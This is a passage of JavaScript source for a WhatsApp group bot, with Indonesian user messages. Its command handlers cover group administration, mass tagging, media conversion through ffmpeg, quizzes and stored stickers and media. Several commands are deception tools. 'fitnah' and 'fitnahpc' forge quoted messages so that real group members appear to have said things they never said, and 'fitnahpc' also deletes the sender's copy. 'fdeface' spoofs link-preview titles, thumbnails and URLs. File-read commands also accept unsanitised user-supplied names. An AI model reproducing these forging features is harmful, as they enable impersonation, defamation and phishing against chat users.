huft = await getBuffer(tid.avatarLarger)
teks = `Name : ${tid.uniqueId}\n`
teks += `Followers : ${ted.followerCount}\n`
teks += `Following : ${ted.followingCount}\n`
teks += `heart : ${ted.heart}\n`
teks += `heartCount : ${ted.heartCount}\n`
teks += `Video : ${ted.videoCount}`
xdev.sendMessage(from, huft, image, {quoted: ftroli, caption: teks})
break
case 'gogle':
if (!q) return reply('Mau cari apa kak?')
anu = await fetchJson(`https://hardianto-chan.herokuapp.com/google?q=${q}`)
		   for (let co of anu.result) {
					  teks += `
\nTITLE : ${co.title}\nSNIPPET : ${co.snippet}
\nLINK : ${co.link}\n`
				   }
				   reply(teks)
				break
case 'caklontong':
tod = await fetchJson(`https://hardianto-chan.herokuapp.com/kuis/caklontong?apikey=hardianto`)
tid = tod.result.soal
ted = tod.result.deskripsi
reply(tid)
setTimeout( () => {
reply(ted)
}, 20000)
break
case 'tebakgambar':
tod = await fetchJson(`https://hardianto-chan.herokuapp.com/kuis/tebakgambar?apikey=hardianto`)
tid = await getBuffer(tod.result.images)
ted = tod.result.jawaban
xdev.sendMessage(from, tid, image, {quoted: ftroli, caption: 'Tebak gambar nya dalam 30 detik'})
setTimeout( () => {
reply(ted)
}, 30000)
break

case 'antilink':
					if (!isGroup) return reply('Kusus group')
					if (!isGroupAdmins) return reply('Kusus admin')
					if (!isBotGroupAdmins) return reply('Bot jadiin admin dlu')
					if (args.length < 1) return reply(`untuk mengaktifkan ketik : ${prefix}antilink 1`)
					if (Number(args[0]) === 1) {
						if (isAntiLink) return reply('Sudah Aktif Kak')
						antilink.push(from)
						fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
						reply('_Success mengaktifkan antilink digroup ini!_')
					} else if (Number(args[0]) === 0) {
						if (!isAntiLink) return reply('Sudah Mati Kak')
						var ini = antilink.indexOf(from)
						antilink.splice(ini, 1)
						fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
						reply('_Success mematikan antilink digroup ini!_')
					} else {
						reply('1 untuk mengaktifkan, 0 untuk mematikan')
					}
					break
					case 'antivirtex':
if (!isGroup) return reply('Kusus group')
if (!isGroupAdmins) return reply('Kusus admin')
if (!isBotGroupAdmins) return reply('Bot jadiin admin dlu')
if (args.length < 1) return reply('ketik 1 untuk mengaktifkan\nketik 0 untuk menonaktifkan')
if (args[0] === "1") {
if (AntiVirtex) return reply('Sudah Aktif')
antivirtex.push(from)
fs.writeFileSync('./database/antivirtex.json', JSON.stringify(antivirtex))
reply('_Succes menyalakan antivirtex di group ini_')
} else if (args[0] === "0") {
if (!AntiVirtex) return reply('Sudah Mati')
let off = antivirtex.indexOf(from)
antivirtex.splice(off, 1)
fs.writeFileSync('./database/antivirtex.json', JSON.stringify(antivirtex))
reply('_Succes mematikan antivirtex di group ini_')
} else {
reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
}
break
case 'add':
					if (!isGroup) return reply(mess.only.group)
					if (!isOwner & !dev.key.fromMe & !isGroupAdmins) return reply(mess.admin)
					if (!isBotGroupAdmins) return reply(mess.badmin)
					if (args.length < 1) return reply('Yang mau di add jin ya?')
					if (args[0].startsWith('08')) return reply('Gunakan kode negara mas')
					try {
						num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
						xdev.groupAdd(from, [num])
					} catch (e) {
						console.log('Error :', e)
						reply('Gagal menambahkan target, mungkin karena di private')
					}
					break
					/*case 'kick':
if (!isGroup) return reply(mess.only.group) 
if (!isOwner && !dev.key.fromMe && !isGroupAdmins) return reply(mess.admin)
if (!isBotGroupAdmins) return reply('Bot harus admin!')
if (!isGroup) return
//if (dev.message.extendedTextMessage === null || dev.message.extendedTextMessage === undefined) return;
if (dev.message.extendedTextMessage === undefined || nay.message.extendedTextMessage === null) return reply('tag yg ingin di kick!')
//if (dev.message.extendedTextMessage.contextInfo.participant === undefined) {
entah = dev.message.extendedTextMessage.contextInfo.mentionedJid
if (entah.length > 1) {
var mems_ids = []
for (let ids of entah) {
mems_ids.push(ids)
}
xdev.groupRemove(from, mems_ids)
} else {
xdev.groupRemove(from, [entah[0]])
}
} else {
entah = xdev.message.extendedTextMessage.contextInfo.participant
xdev.groupRemove(from, [entah])
}
break*/

case 'linkgc':
case 'linkgrup':
case 'linkgrop':
case 'linkgroup':
if (!isGroup) return
if (!isBotGroupAdmins) return reply('Bot not admin')
linkgc = await xdev.groupInviteCode(from)
yeh = `\`\`\`「 Link Group 」\`\`\`\n•> Group Whatsapp :\nhttps://chat.whatsapp.com/${linkgc}\n\n_yo bisa yo ramein_`
xdev.sendMessage(from, yeh, text, { quoted: dev })
break

case 'group':
if (!isOwner && !dev.key.fromMe && !isGroupAdmins) return reply('Admin Group Only')
if (!isBotGroupAdmins) return reply('Bot not admin')
if (!isGroup) return
if (args[0] === 'open') {
xdev.groupSettingChange(from, GroupSettingChange.messageSend, false)
} else if (args[0] === 'close') {
xdev.groupSettingChange(from, GroupSettingChange.messageSend, true)
}
break

case 'setdesc':
if (!isOwner && !dev.key.fromMe && !isGroupAdmins) return reply('Admin Group Only')
if (!isBotGroupAdmins) return reply('Bot not admin')
if (!isGroup) return
xdev.groupUpdateDescription(from, `${args.join(" ")}`)
break

case 'setname':
if (!isOwner && !dev.key.fromMe && !isGroupAdmins) return reply('Admin Group Only')
if (!isBotGroupAdmins) return reply('Bot not admin')
if (!isGroup) return
xdev.groupUpdateSubject(from, `${args.join(" ")}`)
xdev.sendMessage(from, 'Succes change name group', text, {quoted:dev})
break

case 'demote':
if (!isOwner && !dev.key.fromMe && !isGroupAdmins) return reply('Admin Group Only')
if (!isGroup) return
if (!isBotGroupAdmins) return reply('Bot not admin')
if (dev.message.extendedTextMessage === undefined || dev.message.extendedTextMessage === null) return reply('Reply members')
mentionede = dev.message.extendedTextMessage.contextInfo.participant
xdev.groupDemoteAdmin(from, [mentionede])
teks = `Members @${mentionede.split('@')[0]} succes demote`
xdev.sendMessage(from, teks, text, {quoted:dev, contextInfo:{mentionedJid:[mentionede]}})
break

case 'promote':
if (!isOwner && !dev.key.fromMe && !isGroupAdmins) return reply('Admin Group Only')
if (!isGroup) return
if (!isBotGroupAdmins) return reply('Bot not admin')
if (dev.message.extendedTextMessage === undefined || dev.message.extendedTextMessage === null) return reply('Reply members')
mentionede = dev.message.extendedTextMessage.contextInfo.participant
xdev.groupMakeAdmin(from, [mentionede])
teks = `Members @${mentionede.split('@')[0]} succes promote`
xdev.sendMessage(from, teks, text, {quoted:dev, contextInfo:{mentionedJid:[mentionede]}})
break

case 'revoke':
if (!dev.key.fromMe && !isOwner && !isGroupAdmins) return reply('Admin Group Only')
if (!isBotGroupAdmins) return reply('Bot not admin')
if (!isGroup) return
xdev.revokeInvite(from)
reply('_Success_')
break
            case 'trigger':
            case 'wanted':
            case 'wasted':
            case 'blur':
            case 'trash':
            case 'circle':
if ((isMedia && !dev.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
reply(mess.wait)
owgi = await xdev.downloadMediaMessage(ger)
anu = await upload(owgi)           
titid = await getBuffer(`https://hardianto-chan.herokuapp.com/canvas/${command}?url=${anu}`)               
xdev.sendMessage(from, titid, image, {quoted : ftroli, caption: '_Success_'}) 
} else {
reply('_Fotonya mana kak?_')
}
break
    case 'kontag':
            if (!dev.key.fromMe && !isOwner && !isGroupAdmins) return reply(mess.admin)
            pe = args.join('')
            entah = pe.split('|')[0]
            nah = pe.split('|')[1]
            if (isNaN(entah)) return reply('Invalid phone number');
            members_ids = []
            for (let mem of groupMembers) {
            members_ids.push(mem.jid)
            }
            vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n'
            + `FN:${nah}\n`
            + `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum('+' + entah).getNumber('internasional')}\n`
            + 'END:VCARD'.trim()
            xdev.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact, {contextInfo: {"mentionedJid": members_ids}})
            break
    case 'sticktag':
            if (!dev.key.fromMe && !isOwner && !isGroupAdmins) return reply(mess.admin)
            if ((isMedia && !dev.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await xdev.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await xdev.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
            xdev.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else {
            reply(`*Reply sticker yang sudah dikirim*`)
            }
            break
    case 'totag':
            if (!dev.key.fromMe && !isOwner && !isGroupAdmins) return reply(mess.admin)
            if ((isMedia && !dev.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await xdev.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await xdev.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
            xdev.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !dev.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await xdev.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await xdev.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
            xdev.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !dev.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await xdev.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await xdev.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            	mimetype : 'audio/mp4',
            	ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
            xdev.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !dev.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await xdev.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await xdev.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            	mimetype : 'video/mp4',
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
            xdev.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
          reply(`reply gambar/sticker/audio/video dengan caption ${prefix}totag`)
        }
        break
    case 'fitnah':
            if (args.length < 1) return reply(`Usage :\n${prefix}fitnah [@tag|pesan|balasanbot]]\n\nEx : \n${prefix}fitnah @tagmember|hai|hai juga`)
            var gh = args.join('')
            mentioned = dev.message.extendedTextMessage.contextInfo.mentionedJid
            var replace = gh.split("|")[0];
            var target = gh.split("|")[1];
            var bot = gh.split("|")[2];
            xdev.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${mentioned}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target}` }}})
            break
    case 'settarget':
            if (!dev.key.fromMe && !isOwner) return reply(mess.owner)
            if(!q) return reply(`${prefix}settarget 628xxxxx`)
            targetpc = args[0]
            fakegroup(`Succes Mengganti target fitnahpc : ${targetpc}`)
            break
    case 'fitnahpc':
            if(!q) return reply(`${prefix}fitnahpc teks target|teks lu`)
            jids = `${targetpc}@s.whatsapp.net` // nomer target
            var split = args.join(' ').replace(/@|\d/gi, '').split('|')
            var taged = dev.message.extendedTextMessage.contextInfo.mentionedJid[0]
            var options = {contextInfo: {quotedMessage: {extendedTextMessage: {text: split[0]}}}}
            const responye = await xdev.sendMessage(jids, `${split[1]}`, MessageType.text, options)
            await xdev.deleteMessage(jids, { id: responye.messageID, remoteJid: jids, fromMe: true })
            break
    case 'tomp3':
            if (!isQuotedVideo) return fakegroup('Reply videonya!')
            fakegroup(mess.wait)
            encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await xdev.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            xdev.sendMessage(from, buffer453, audio, { mimetype: 'audio/mp4', quoted: dev })
            fs.unlinkSync(ran)
            })
            break
    case 'fast':
            if (!isQuotedVideo) return fakegroup('Reply videonya!')
            fakegroup(mess.wait)
            encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await xdev.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            xdev.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: dev })
            fs.unlinkSync(ran)
            })
            break
    case 'slow':
            if (!isQuotedVideo) return fakegroup('Reply videonya!')
            fakegroup(mess.wait)
            encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await xdev.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            xdev.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: dev })
            fs.unlinkSync(ran)
            })
            break
     case 'addrespon':{
          if (!isOwner && !dev.key.fromMe) return reply(mess.owner)
          if (args.length < 1) return reply(`Penggunaan ${prefix}addrespon key|respon\n\nContoh : ${prefix}addrespon hai|juga`)
          let input1 = body.slice(11)
          if (!input1.includes('|')) return reply(`Penggunaan ${prefix}addrespon key|respon\n\nContoh : ${prefix}addrespon hai|juga`)
          let input = input1.split("|")
          if (checkCommands(input[0], commandsDB) === true) return reply(`Command tersebut sudah ada`)
          addCommands(input[0], input[1], sender, commandsDB) 
          reply(`Key : ${input[0]}\nRespon : ${input[1]}\n\nRespon berhasil di set`)
          }
      break
      case 'dellrespon':
      case 'delrespon':{
          if (!isOwner && !dev.key.fromMe) return reply(mess.owner)
            if (args.length < 1) return reply(`Penggunaan ${prefix}delrespon key\n\nContoh : ${prefix}delrespon hai`)
          if (!checkCommands(body.slice(11), commandsDB)) return reply(`Key tersebut tidak ada di database`)
          deleteCommands(body.slice(11), commandsDB)
          reply(`Berhasil menghapus respon dengan key ${body.slice(11)}`)
          }
      break
        case 'listrespon':{
          let txt = `List Respon\nTotal : ${commandsDB.length}\n\n`
          for (let i = 0; i < commandsDB.length; i++){
          txt += `❏ Key : ${commandsDB[i].pesan}\n`
          }
          reply(txt)
          }
        break
    case 'reverse':
            if (!isQuotedVideo) return fakegroup('Reply videonya!')
            encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            media = await xdev.downloadAndSaveMediaMessage(encmedia)
            ran = getRandom('.mp4')
            exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
            fs.unlinkSync(media)
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            xdev.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: dev })
            fs.unlinkSync(ran)
            })
            break
    case 'owner':
let ini_list = []
for (let i of ownerNumber) {
const vname = xdev.contacts[i] != undefined ? xdev.contacts[i].vname || xdev.contacts[i].notify : undefined
ini_list.push({
"displayName": '𝐻𝑎𝑚 - ??𝑜𝑡𝑧𝑧',
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:${vname ? `${vname}` : `${xdev.user.name}`}\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
})
}
hehe = await xdev.sendMessage(from, {
"displayName": `${ini_list.length} kontak`,
"contacts": ini_list 
}, 'contactsArrayMessage', { quoted: dev })
xdev.sendMessage(from,'Nih Kak Owner ku',text,{quoted: hehe})
break
case 'style':
				  if(!q) return reply('Masukkan teks!')
         reply(mess.wait)
			axios.get(`https://kocakz.herokuapp.com/api/random/text/fancytext?text=${body.slice(7)}`).then((res) => {
      let hasil = `*Hasil* :\n${res.data.result}`;
      xdev.sendMessage(from, hasil, MessageType.text, { quoted: dev});
    })
			break
case 'pastebin':
if(!q) return reply(`Example : X - Dev Bot`)
anu = await fetchJson(`https://api-anoncybfakeplayer.herokuapp.com/pastebin?text=${q}`, {method: 'get'})
                   xdev.sendMessage(from, `${anu.result}`, text, {quoted: ftroli})
                     break
    case 'anime':
            reply(mess.wait)
            fetch('https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt')
            .then(res => res.text())
            .then(body => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
            .then((response) => {
            media =  Buffer.from(response, 'base64');
            xdev.sendMessage(from,media,image,{quoted:dev,caption:'NIH'})
            }
            )
            .catch((error) => {
            console.log(error); 
            }
            )
            });
            break
    case 'kontak':
            pe = args.join(' ') 
            entah = pe.split('|')[0]
            nah = pe.split('|')[1]
            if (isNaN(entah)) return reply('Invalid phone number');
            vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n'
            + `FN:${nah}\n`
            + `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum('+' + entah).getNumber('internasional')}\n`
            + 'END:VCARD'.trim()
            xdev.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact)
            break    
    case 'take':
    case 'colong':
    		if (!isQuotedSticker) return reply('Stiker aja om')
            encmedia = JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo
		    media = await xdev.downloadAndSaveMediaMessage(encmedia)
            anu = args.join(' ').split('|')
            satu = anu[0] !== '' ? anu[0] : `HAMBOTZ`
            dua = typeof anu[1] !== 'undefined' ? anu[1] : ``
            require('./lib/fetcher.js').createExif(satu, dua)
			require('./lib/fetcher.js').modStick(media, xdev, dev, from)
			break
	case 'stikerwm':
	case 'stickerwm':
    case 'swm':
            pe = args.join('')
            var a = pe.split("|")[0];
            var b = pe.split("|")[1];
            if (isMedia && !dev.message.videoMessage || isQuotedImage ) {
            const encmedia = isQuotedImage   ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
             media = await xdev.downloadAndSaveMediaMessage(encmedia)
            await createExif(a,b)
            out = getRandom('.webp')
            ffmpeg(media)
            .on('error', (e) => {
            console.log(e)
            xdev.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: dev })
            fs.unlinkSync(media)
            })
            .on('end', () => {
            _out = getRandom('.webp')
            spawn('webpmux', ['-set','exif','./stik/data.exif', out, '-o', _out])
            .on('exit', () => {
            xdev.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: dev })
            fs.unlinkSync(out)
            fs.unlinkSync(_out)
            fs.unlinkSync(media)
            })
            })
            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
            .toFormat('webp')
            .save(out) 
            } else if ((isMedia && dev.message.videoMessage.seconds < 11 || isQuotedVideo && dev.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
            const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
            const media = await xdev.downloadAndSaveMediaMessage(encmedia)
            pe = args.join('')
            var a = pe.split("|")[0];
            var b = pe.split("|")[1];
            await createExif(a,b)
            out = getRandom('.webp')
            ffmpeg(media)
            .on('error', (e) => {
            console.log(e)
            xdev.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: dev })
            fs.unlinkSync(media)
            })
            .on('end', () => {
            _out = getRandom('.webp')
            spawn('webpmux', ['-set','exif','./stik/data.exif', out, '-o', _out])
            .on('exit', () => {
            xdev.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: dev })
            fs.unlinkSync(out)
            fs.unlinkSync(_out)
            fs.unlinkSync(media)
            })
            })
            .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
            .toFormat('webp')
            .save(out)       
            } else {
            reply(`Kirim gambar dengan caption ${prefix}swm teks|teks atau tag gambar yang sudah dikirim`)
            }
            break
    case 'upswteks':
            if (!dev.key.fromMe && !isOwner) return reply(mess.owner)
            if (!q) return fakestatus('Isi teksnya!')
            xdev.sendMessage('status@broadcast', `${q}`, extendedText)
            fakegroup(`Sukses Up story wea teks ${q}`)
            break
    case 'upswimage':
            if (!dev.key.fromMe && !isOwner) return reply(mess.owner)
            if (isQuotedImage) {
            const swsw = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            cihcih = await xdev.downloadMediaMessage(swsw)
            xdev.sendMessage('status@broadcast', cihcih, image, { caption: `${q}` })
            bur = `Sukses Upload Story Image dengan Caption: ${q}`
            xdev.sendMessage(from, bur, text, { quoted: dev })
            } else {
            fakestatus('Reply gambarnya!')
            }
            break
    case 'upswvideo':
            if (!dev.key.fromMe && !isOwner) return reply(mess.owner)
            if (isQuotedVideo) {
            const swsw = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            cihcih = await xdev.downloadMediaMessage(swsw)
            xdev.sendMessage('status@broadcast', cihcih, video, { caption: `${q}` }) 
            bur = `Sukses Upload Story Video dengan Caption: ${q}`
            xdev.sendMessage(from, bur, text, { quoted: dev })
            } else {
            fakestatus('reply videonya!')
            }
            break
    case 'fdeface':
            ge = args.join('')           
            var pe = ge.split("|")[0];
            var pen = ge.split("|")[1];
            var pn = ge.split("|")[2];
            var be = ge.split("|")[3];
            const fde = `kirim/reply image dengan capion ${prefix}fdeface link|title|desc|teks`
            if (args.length < 1) return reply (fde)
            const dipes = isQuotedSticker || isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev
            const tipes = await xdev.downloadAndSaveMediaMessage(dipes)        
            const bufer = fs.readFileSync(tipes)
            const desc = `${pn}`
            const title = `${pen}`
            const url = `${pe}`
            const buu = `https://${be}`
    		var anu = {
        	detectLinks: false
    		}
    		var mat = await xdev.generateLinkPreview(url)
    		mat.title = title;
    		mat.description = desc;
    		mat.jpegThumbnail = bufer;
   			mat.canonicalUrl = buu; 
    		xdev.sendMessage(from, mat, MessageType.extendedText, anu)
            break
    case 'public':
          	if (!dev.key.fromMe && !isOwner) return
          	if (banChats === false) return
          	// var taged = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]
          	banChats = false
          	fakestatus(`「 *PUBLIC-MODE* 」`)
          	break
	case 'self':
          	if (!dev.key.fromMe && !isOwner) return
          	if (banChats === true) return
          	uptime = process.uptime()
         	 // var taged = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]
         	banChats = true
          	fakestatus(`「 *SELF-MODE* 」`)
          	break
      //********** ADD **********//
		case 'addstik':
		if (!dev.key.fromMe && !isOwner) return reply (mess.owner)
				if (!isQuotedSticker) return reply('Reply stiker nya')
				svst = body.slice(9)
				if (!svst) return reply('Nama sticker nya apa?')
				boij = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await xdev.downloadMediaMessage(boij)
				setiker.push(`${svst}`)
				fs.writeFileSync(`./temp/stick/${svst}.webp`, delb)
				fs.writeFileSync('./temp/stick.json', JSON.stringify(setiker))
				xdev.sendMessage(from, `Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststik`, MessageType.text, { quoted: dev})
				break
					case 'dellstik':
					if(!dev.key.fromMe & !isOwner) return reply('Only owner')
					if (!q) return reply(mess.wrongFormat)
					try {
						fs.unlinkSync(`./temp/stick/${q}.webp`)
						setiker.splice(q,1)
						fs.writeFileSync('./temp/stick.json', JSON.stringify(setiker))
						reply(`Succes delete sticker ${q}!`)
					} catch (err) {
						reply(`Gagal delete sticker ${q}!`)
					}
					break
			
				
							case 'addimg':
				if (!dev.key.fromMe && !isOwner) return reply (mess.owner)
				if (!isQuotedImage) return reply('Reply imagenya')
				svst = body.slice(8)
				if (!svst) return reply('Nama imagenya apa')
				boij = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await xdev.downloadMediaMessage(boij)
				imagenye.push(`${svst}`)
				fs.writeFileSync(`./temp/foto/${svst}jpeg`, delb)
				fs.writeFileSync('./temp/image.json', JSON.stringify(imagenye))
				xdev.sendMessage(from, `Sukses Menambahkan image\nCek dengan cara ${prefix}listimg`, MessageType.text, { quoted: dev})
				break
				
				case 'addvid':
				if (!dev.key.fromMe && !isOwner) return reply (mess.owner)
				if (!isQuotedVideo) return reply('Reply vidionya')
				svst = body.slice(8)
				if (!svst) return reply('Nama vidionya apa')
				boij = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await xdev.downloadMediaMessage(boij)
				imagenye.push(`${svst}`)
				fs.writeFileSync(`./temp/video/${svst}.mp4`, delb)
				fs.writeFileSync('./temp/video.json', JSON.stringify(imagenye))
				xdev.sendMessage(from, `Sukses Menambahkan video\nCek dengan cara ${prefix}listvideo`, MessageType.text, { quoted: dev })
				break
				
				case 'addvn':
				if (!dev.key.fromMe && !isOwner) return reply (mess.owner)
				if (!isQuotedAudio) return reply('Reply vnnya')
				svst = body.slice(7)
				if (!svst) return reply('Nama audionya apa')
				boij = JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await xdev.downloadMediaMessage(boij)
				audionye.push(`${svst}`)
				fs.writeFileSync(`./temp/audio/${svst}.mp3`, delb)
				fs.writeFileSync('./temp/vn.json', JSON.stringify(audionye))
				xdev.sendMessage(from, `Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`, MessageType.text, { quoted: dev})
				break
				
				case 'liststik':
				teks = '*Sticker list :*\n\n'
				for (let awokwkwk of setiker) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${setiker.length}*`
				xdev.sendMessage(from, teks.trim(), extendedText, { quoted: dev, contextInfo: { "mentionedJid": setiker } })
				break
				
				case 'listimg':
				teks = '*Image list :*\n\n'
				for (let awokwkwk of imagenye) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${imagenye.length}*`
				xdev.sendMessage(from, teks.trim(), extendedText, { quoted: dev, contextInfo: { "mentionedJid": setiker } })
				break
				
				case 'listvid':
				  case 'listvideo':
				teks = '*List Video :*\n\n'
				for (let awokwkwk of videonye) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${videonye.length}* `
				xdev.sendMessage(from, teks.trim(), extendedText, { quoted: dev, contextInfo: { "mentionedJid": imagenye } })
				break
				
				case 'listvn':
			case 'vnlist':
				teks = '*List Vn:*\n\n'
				for (let awokwkwk of audionye) {
					teks += `- ${awokwkwk}\n`
				}
				teks += `\n*Total : ${audionye.length}*`
				xdev.sendMessage(from, teks.trim(), extendedText, { quoted: dev, contextInfo: { "mentionedJid": audionye } })
				break
				
				case 'getstik':
				namastc = body.slice(9)
				try {
				result = fs.readFileSync(`./temp/stick/${namastc}.webp`)
				xdev.sendMessage(from, result, sticker,{quoted:dev})
				} catch {
				  reply('Pack tidak terdaftar')
				}
				break
				
				case 'getimg':
				namastc = body.slice(8)
				try {
				buffer = fs.readFileSync(`./temp/foto/${namastc}.jpeg`)
				xdev.sendMessage(from, buffer, image, { quoted: dev, caption: `Result From Database : ${namastc}.jpeg` })
